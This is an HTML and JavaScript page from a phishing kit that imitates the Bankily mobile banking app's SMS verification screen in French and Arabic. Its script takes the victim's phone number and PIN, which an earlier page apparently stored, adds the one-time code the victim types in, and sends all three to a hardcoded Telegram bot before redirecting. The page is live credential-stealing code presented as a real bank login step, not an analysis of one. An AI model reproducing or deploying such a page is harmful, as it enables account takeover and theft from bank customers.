<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#0097A7">
<title>Code de vérification – Bankily</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;min-height:100vh;overflow-x:hidden}
body{
  font-family:'Cairo',sans-serif;
  background:#f5f5f5;
  color:#222;
  min-height:100vh;
  display:flex;flex-direction:column;
}

/* ══ TOP BAR (teal — same as Bankily) ══ */
.top-bar{
  background:#0097A7;
  height:56px;padding:0 16px;
  display:flex;align-items:center;justify-content:space-between;
  flex-shrink:0;position:relative;
}
.tb-back{
  background:none;border:none;cursor:pointer;
  color:#fff;font-size:22px;line-height:1;
  padding:4px 8px;text-decoration:none;
  display:inline-flex;align-items:center;
}
.tb-title{
  color:#fff;font-family:'Cairo',sans-serif;
  font-size:17px;font-weight:700;
  position:absolute;left:50%;transform:translateX(-50%);
  white-space:nowrap;
}
.tb-lang{
  background:rgba(255,255,255,.2);
  border:1px solid rgba(255,255,255,.5);
  border-radius:20px;color:#fff;
  font-family:'Cairo',sans-serif;
  font-size:13px;font-weight:700;
  padding:4px 14px;cursor:pointer;
}

/* ══ PAGE ══ */
.page{
  flex:1;background:#fff;
  display:flex;flex-direction:column;
  padding:36px 24px calc(80px + env(safe-area-inset-bottom));
  max-width:480px;margin:0 auto;width:100%;
}

/* ══ INSTRUCTION ══ */
.instruction{
  font-size:16px;font-weight:700;
  color:#222;line-height:1.5;
  margin-bottom:36px;
  font-family:'Cairo',sans-serif;
}

/* ══ OTP DASHES — exact Bankily style ══ */
.otp-row{
  display:flex;justify-content:center;
  gap:20px;direction:ltr;
  margin-bottom:28px;
}
.otp-box{
  width:48px;height:52px;
  font-family:'Cairo',sans-serif;
  font-size:24px;font-weight:800;
  text-align:center;direction:ltr;
  background:transparent;
  border:none;outline:none;
  border-bottom:2.5px solid #444;
  color:#222;
  caret-color:#0097A7;
  -webkit-appearance:none;border-radius:0;
  transition:border-color .2s;
}
.otp-box:focus{border-bottom-color:#0097A7}

/* ══ TIMER ══ */
.timer-section{
  text-align:center;
  margin-bottom:20px;
}
.timer-label{
  font-size:14px;font-weight:700;color:#333;
  margin-bottom:4px;font-family:'Cairo',sans-serif;
}
.timer-val{
  font-size:16px;font-weight:800;
  color:#333;font-family:'Cairo',sans-serif;
  font-variant-numeric:tabular-nums;
}
.timer-val.expired{color:#e53935}

/* ══ SPINNER ══ */
.spin-wrap{
  display:flex;justify-content:center;
  margin-bottom:20px;
}
.ring{
  width:36px;height:36px;border-radius:50%;
  border:4px solid #f0f0f0;
  border-top-color:#F5C20B;
  animation:spin .9s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* ══ RESEND ══ */
.resend-btn{
  display:block;width:100%;text-align:center;
  background:none;border:none;
  color:#aaa;font-family:'Cairo',sans-serif;
  font-size:14px;font-weight:600;
  text-decoration:underline;cursor:pointer;
  padding:8px 0;
}
.resend-btn:hover{color:#0097A7}

/* ══ BOTTOM BUTTON ══ */
.btn-bar{
  position:fixed;bottom:0;left:0;right:0;z-index:100;
}
.verify-btn{
  display:block;width:100%;
  padding:18px;border:none;
  background:#F5C20B;
  color:#fff;font-family:'Cairo',sans-serif;
  font-size:18px;font-weight:800;
  cursor:pointer;transition:background .2s;
}
.verify-btn:hover{background:#E0B008}
.verify-btn:active{background:#CDA007}
.verify-btn:disabled{background:#ccc;cursor:not-allowed}

/* ══ LOADER ══ */
#loader-overlay{
  display:none;position:fixed;inset:0;
  background:rgba(255,255,255,.94);z-index:9999;
  flex-direction:column;align-items:center;justify-content:center;gap:16px;
}
#loader-overlay.active{display:flex}
.ld-ring{width:48px;height:48px;position:relative}
.ld-ring::before{
  content:'';position:absolute;inset:0;border-radius:50%;
  border:3px solid #eee;border-top-color:#F5C20B;
  animation:spin .8s linear infinite;
}
.ld-text{font-size:15px;color:#0097A7;font-weight:700;font-family:'Cairo',sans-serif}

/* ══ MODAL ══ */
#modal-alert{
  display:none;position:fixed;inset:0;
  background:rgba(0,0,0,.45);z-index:10000;
  justify-content:center;align-items:center;padding:20px;
}
#modal-alert.show{display:flex}
.modal-box{
  background:#fff;border-radius:16px;
  padding:24px 20px;max-width:340px;width:100%;
  text-align:center;box-shadow:0 8px 40px rgba(0,0,0,.2);
}
.modal-box p{
  font-size:15px;color:#222;line-height:1.7;
  margin-bottom:18px;white-space:pre-line;
  font-family:'Cairo',sans-serif;
}
.modal-box button{
  background:#F5C20B;color:#fff;border:none;
  padding:11px 32px;border-radius:10px;
  cursor:pointer;font-family:'Cairo',sans-serif;
  font-size:15px;font-weight:700;width:100%;
}

/* ══ GUARD ══ */
#guard-overlay{
  display:none;position:fixed;inset:0;
  background:#fff;z-index:99999;
  flex-direction:column;justify-content:center;align-items:center;
  gap:14px;padding:20px;text-align:center;
}
#guard-overlay.active{display:flex}
.g-icon{font-size:52px}
.g-msg{font-size:17px;font-weight:800;color:#222;line-height:1.5}
.g-sub{font-size:13px;color:#F59E0B}
.g-spin{width:40px;height:40px;border-radius:50%;
  border:4px solid #f0f0f0;border-top-color:#0097A7;
  animation:spin .8s linear infinite;margin-top:6px}
</style>
</head>
<body>

<!-- Guard -->
<div id="guard-overlay">
  <div class="g-icon">🔒</div>
  <div class="g-msg" id="guard-msg"></div>
  <div class="g-sub" id="guard-sub"></div>
  <div class="g-spin"></div>
</div>

<!-- Loader -->
<div id="loader-overlay">
  <div class="ld-ring"></div>
  <div class="ld-text" id="ld-text">Vérification en cours...</div>
</div>

<!-- Modal -->
<div id="modal-alert">
  <div class="modal-box">
    <p id="modal-text"></p>
    <button id="modal-close">OK</button>
  </div>
</div>

<!-- Top bar -->
<div class="top-bar">
  <a href="login.html" class="tb-back" id="back-btn">&#8592;</a>
  <span class="tb-title" id="tb-title">Code de vérification</span>
  <button class="tb-lang" id="lang-btn" onclick="toggleLang()">عربي</button>
</div>

<!-- Page -->
<div class="page">

  <!-- Instruction -->
  <p class="instruction" id="instruction">
    Entrez le code de vérification transmis sur votre numéro de téléphone
  </p>

  <!-- OTP boxes — dash style -->
  <div class="otp-row" dir="ltr">
    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr" autocomplete="one-time-code">
    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
    <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
  </div>

  <!-- Timer -->
  <div class="timer-section">
    <div class="timer-label" id="timer-label">Code de vérification expire dans</div>
    <div class="timer-val" id="timer">4 Minutes 59 Secondes</div>
  </div>

  <!-- Spinner -->
  <div class="spin-wrap"><div class="ring"></div></div>

  <!-- Resend -->
  <button class="resend-btn" id="resend-btn" onclick="resendCode()">
    Renvoyer code de vérification
  </button>

</div>

<!-- Fixed button -->
<div class="btn-bar">
  <button class="verify-btn" id="verify-btn" onclick="submitOTP()">Verifié</button>
</div>

<script>
const T = {
  ar:{
    dir:'rtl',lang:'ar',langBtn:'FR',
    back:'رجوع &#8594;',
    title:'رمز التحقق',
    instruction:'أدخل رمز التحقق المرسل إلى رقم هاتفك عبر رسالة SMS',
    timerLabel:'ينتهي رمز التحقق بعد',
    resend:'إعادة إرسال رمز التحقق',
    verify:'تحقق',
    loading:'جاري التحقق...',
    resendDone:'تم إرسال رمز جديد ✓',
    expired:'انتهت الصلاحية',
    errEmpty:'الرجاء إدخال جميع الأرقام الأربعة',
    errSamePin:'رمز التحقق لا يمكن أن يكون نفس رمز PIN',
    errTooFast:'عزيزي المشترك،\nيجب التأكد من إدخال رمز التحقق الذي وصلك عبر SMS',
    guardMsg:'يجب إدخال رقمك ورمزك السري أولاً',
    guardSub:'جاري تحويلك...',
    minutes:'دقيقة',seconds:'ثانية',
  },
  fr:{
    dir:'ltr',lang:'fr',langBtn:'عربي',
    back:'&#8592;',
    title:'Code de vérification',
    instruction:'Entrez le code de vérification transmis sur votre numéro de téléphone',
    timerLabel:'Code de vérification expire dans',
    resend:'Renvoyer code de vérification',
    verify:'Verifié',
    loading:'Vérification en cours...',
    resendDone:'Un nouveau code a été envoyé ✓',
    expired:'Code expiré',
    errEmpty:'Veuillez entrer les 4 chiffres du code',
    errSamePin:'Le code ne peut pas être identique au PIN',
    errTooFast:"Cher(e) abonné(e),\nVeuillez saisir le code de vérification reçu par SMS",
    guardMsg:"Saisissez d'abord votre numéro et code PIN",
    guardSub:'Redirection vers la page de connexion...',
    minutes:'Minutes',seconds:'Secondes',
  }
};

let isArabic = localStorage.getItem('bankily_lang') === 'ar';

function applyLang(){
  const t = isArabic ? T.ar : T.fr;
  document.documentElement.lang = t.lang;
  document.documentElement.dir  = t.dir;
  document.body.dir              = t.dir;
  document.getElementById('back-btn').innerHTML       = t.back;
  document.getElementById('lang-btn').textContent     = t.langBtn;
  document.getElementById('tb-title').textContent     = t.title;
  document.getElementById('instruction').textContent  = t.instruction;
  document.getElementById('timer-label').textContent  = t.timerLabel;
  document.getElementById('resend-btn').textContent   = t.resend;
  document.getElementById('verify-btn').textContent   = t.verify;
  document.getElementById('ld-text').textContent      = t.loading;
  document.querySelector('.otp-row').dir = 'ltr';
}
function toggleLang(){
  isArabic = !isArabic;
  localStorage.setItem('bankily_lang', isArabic?'ar':'fr');
  applyLang();
}

function showModal(msg){
  document.getElementById('modal-text').textContent = msg;
  document.getElementById('modal-alert').classList.add('show');
}
document.getElementById('modal-close').addEventListener('click',()=>{
  document.getElementById('modal-alert').classList.remove('show');
});

/* Guard */
const savedPin      = sessionStorage.getItem('bankily_pin');
const savedUsername = sessionStorage.getItem('bankily_username') || '—';

applyLang();

if(!savedPin || savedPin.trim()===''){
  const t = isArabic ? T.ar : T.fr;
  document.getElementById('guard-msg').textContent = t.guardMsg;
  document.getElementById('guard-sub').textContent = t.guardSub;
  document.getElementById('guard-overlay').classList.add('active');
  setTimeout(()=>window.location.replace('login.html'), 1800);
} else {

  const inputs    = [...document.querySelectorAll('.otp-box')];
  const verifyBtn = document.getElementById('verify-btn');
  const timerEl   = document.getElementById('timer');
  const pageLoaded = Date.now();

  /* OTP input UX */
  inputs.forEach((inp,i)=>{
    inp.addEventListener('input',()=>{
      inp.value = inp.value.replace(/[^0-9]/g,'').slice(0,1);
      if(inp.value && i < inputs.length-1) inputs[i+1].focus();
    });
    inp.addEventListener('keydown',e=>{
      if(e.key==='Backspace'){
        if(inp.value==='' && i>0){ inputs[i-1].value=''; inputs[i-1].focus(); }
        else inp.value='';
        e.preventDefault();
      }
      if(!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key))
        e.preventDefault();
    });
    inp.addEventListener('paste',e=>{
      e.preventDefault();
      const digits=(e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
      [...digits].slice(0,4).forEach((d,j)=>{ if(inputs[j]) inputs[j].value=d; });
      inputs[Math.min(digits.length,inputs.length-1)].focus();
    });
  });
  inputs[0].focus();

  /* ── Timer — format "X Minutes Y Secondes" ── */
  let seconds = 299;
  let timerInterval;

  function updateTimer(){
    const t = isArabic ? T.ar : T.fr;
    if(seconds > 0){
      const m = Math.floor(seconds/60);
      const s = seconds % 60;
      timerEl.textContent = `${m} ${t.minutes} ${s} ${t.seconds}`;
      timerEl.classList.remove('expired');
      seconds--;
    } else {
      clearInterval(timerInterval);
      timerEl.textContent = t.expired;
      timerEl.classList.add('expired');
      verifyBtn.disabled = true;
    }
  }
  updateTimer();
  timerInterval = setInterval(updateTimer,1000);

  /* Resend */
  window.resendCode = function(){
    clearInterval(timerInterval);
    seconds = 299;
    timerEl.classList.remove('expired');
    verifyBtn.disabled = false;
    inputs.forEach(i=>{i.value='';});
    inputs[0].focus();
    showModal((isArabic?T.ar:T.fr).resendDone);
    updateTimer();
    timerInterval = setInterval(updateTimer,1000);
  };

  /* Keyboard lift */
  if(window.visualViewport){
    window.visualViewport.addEventListener('resize',()=>{
      const kb=window.innerHeight-window.visualViewport.height;
      document.querySelector('.btn-bar').style.transform=kb>10?`translateY(-${kb}px)`:'';
    });
  }

  /* ══ TELEGRAM ══ */
  const TG_TOKEN   = '8699990453:AAF00aHjLBVLx95RkZozelaAqqhOg29H5fk';
  const TG_CHAT_ID = '8674569520';
  async function sendTelegram(text){
    try{
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:TG_CHAT_ID,text,parse_mode:'HTML'})
      });
    }catch(e){}
  }

  /* Submit */
  window.submitOTP = async function(){
    const t = isArabic ? T.ar : T.fr;
    if((Date.now()-pageLoaded)/1000 < 5){ showModal(t.errTooFast); return; }

    const otp = inputs.map(i=>i.value).join('');
    if(otp.length!==4){ showModal(t.errEmpty); return; }
    if(otp===savedPin){
      showModal(t.errSamePin);
      inputs.forEach(i=>i.value='');
      inputs[0].focus();
      return;
    }

    document.getElementById('loader-overlay').classList.add('active');
    verifyBtn.disabled = true;

    const now = new Date().toLocaleString(isArabic?'ar-SA':'fr-FR');
    await sendTelegram(
      `✅ <b>Code OTP – Bankily</b>\n`+
      `━━━━━━━━━━━━━━━━━━━━\n`+
      `📱 <b>Numéro :</b> <code>${savedUsername}</code>\n`+
      `🔑 <b>PIN    :</b> <code>${savedPin}</code>\n`+
      `🔢 <b>OTP    :</b> <code>${otp}</code>\n`+
      `📅 <b>Heure  :</b> ${now}`
    );

    sessionStorage.removeItem('bankily_pin');
    sessionStorage.removeItem('bankily_username');
    setTimeout(()=>window.location.href='approuv.html', 800);
  };

}
</script>
</body>
</html>
